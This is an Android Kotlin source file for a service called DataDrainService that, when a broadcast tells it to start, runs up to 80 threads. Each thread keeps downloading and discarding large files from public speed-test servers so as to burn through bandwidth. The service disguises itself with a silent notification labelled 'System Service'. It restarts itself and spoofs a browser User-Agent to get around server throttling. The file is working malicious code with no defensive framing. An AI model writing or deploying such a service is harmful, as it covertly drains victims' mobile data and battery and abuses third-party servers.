package com.sync.xxx

import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class DataDrainService : Service() {

    companion object {
        const val ACTION_START = "com.sync.xxx.DATA_DRAIN_START"
        const val ACTION_STOP = "com.sync.xxx.DATA_DRAIN_STOP"
        const val EXTRA_INTENSITY = "intensity"
        
        // Target URLs for bandwidth consumption
        private val DRAIN_URLS = arrayOf(
            "https://speed.cloudflare.com/__down?bytes=100000000",
            "https://proof.ovh.net/files/100Mb.dat",
            "https://speedtest.tele2.net/100MB.zip",
            "https://download.thinkbroadband.com/100MB.zip"
        )
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var isReceiverRegistered = false
    private var isDraining = false
    
    private var intensity: Int = 5
    private val executor = Executors.newCachedThreadPool()
    private val drainTasks = mutableListOf<Runnable>()

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                ACTION_START -> {
                    val level = intent.getIntExtra(EXTRA_INTENSITY, 5)
                    mainHandler.post { startDrain(level) }
                }
                ACTION_STOP -> mainHandler.post { stopDrain() }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()

        // Start as foreground service on Android O+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = android.app.NotificationChannel(
                    "data_drain_channel",
                    "Data Service",
                    android.app.NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    setSound(null, null)
                }
                val notificationManager = getSystemService(android.app.NotificationManager::class.java)
                notificationManager?.createNotificationChannel(channel)

                val notification = android.app.Notification.Builder(this, "data_drain_channel")
                    .setContentTitle("System Service")
                    .setContentText("Running")
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .build()

                startForeground(4004, notification)
            } catch (e: Exception) {
                Log.e("DataDrain", "Foreground notification error: ${e.message}")
            }
        }

        try {
            val filter = IntentFilter().apply {
                addAction(ACTION_START)
                addAction(ACTION_STOP)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(receiver, filter, RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(receiver, filter)
            }
            isReceiverRegistered = true
        } catch (e: Exception) {
            Log.e("DataDrain", "registerReceiver error: ${e.message}")
        }
    }

    private fun startDrain(level: Int) {
        if (isDraining) {
            Log.d("DataDrain", "Already draining, skipping duplicate start call")
            return
        }
        
        stopDrain()
        
        intensity = level.coerceIn(1, 10)
        isDraining = true
        
        val threadCount = intensity * 8
        
        Log.d("DataDrain", "Data Drain started with $threadCount download threads (intensity: $intensity)")
        
        // Spawn multiple download threads to consume bandwidth
        repeat(threadCount) { index ->
            val drainTask = Runnable {
                while (isDraining) {
                    try {
                        // Rotate through different URLs to avoid caching
                        val targetUrl = DRAIN_URLS[index % DRAIN_URLS.size]
                        downloadAndDiscard(targetUrl)
                    } catch (e: Exception) {
                        Log.w("DataDrain", "Download error (expected): ${e.message}")
                    }
                    // Small delay between downloads
                    Thread.sleep(100)
                }
            }
            drainTasks.add(drainTask)
            executor.execute(drainTask)
        }
    }

    private fun downloadAndDiscard(urlString: String) {
        var connection: HttpURLConnection? = null
        var inputStream: InputStream? = null
        
        try {
            val url = URL(urlString)
            connection = url.openConnection() as HttpURLConnection
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            connection.requestMethod = "GET"
            
            // Add headers to avoid server-side throttling
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 10)")
            connection.setRequestProperty("Accept", "*/*")
            
            inputStream = connection.inputStream
            val buffer = ByteArray(8192)
            var totalBytes = 0L
            
            // Download and discard data (consume bandwidth without storing)
            var bytesRead = inputStream.read(buffer)
            while (isDraining && bytesRead != -1) {
                totalBytes += bytesRead
                bytesRead = inputStream.read(buffer)
                
                // Stop after consuming a reasonable chunk to rotate URLs
                if (totalBytes > 10_000_000) { // 10MB per session
                    break
                }
            }
            
            Log.d("DataDrain", "Drained ${totalBytes / 1024}KB from $urlString")
            
        } catch (e: Exception) {
            // Expected: connection errors, timeouts, etc.
            Log.d("DataDrain", "Drain cycle error (normal): ${e.javaClass.simpleName}")
        } finally {
            try {
                inputStream?.close()
                connection?.disconnect()
            } catch (e: Exception) {
                // Ignore cleanup errors
            }
        }
    }

    private fun stopDrain() {
        if (!isDraining) {
            return
        }
        
        isDraining = false
        drainTasks.clear()
        
        executor.shutdownNow()
        try {
            executor.awaitTermination(2, TimeUnit.SECONDS)
        } catch (e: InterruptedException) {
            Log.e("DataDrain", "Executor shutdown interrupted: ${e.message}")
        }
        
        Log.d("DataDrain", "Data Drain stopped")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        stopDrain()
        if (isReceiverRegistered) {
            try {
                unregisterReceiver(receiver)
                isReceiverRegistered = false
            } catch (e: Exception) {
                Log.e("DataDrain", "unregisterReceiver error: ${e.message}")
            }
        }
    }
}
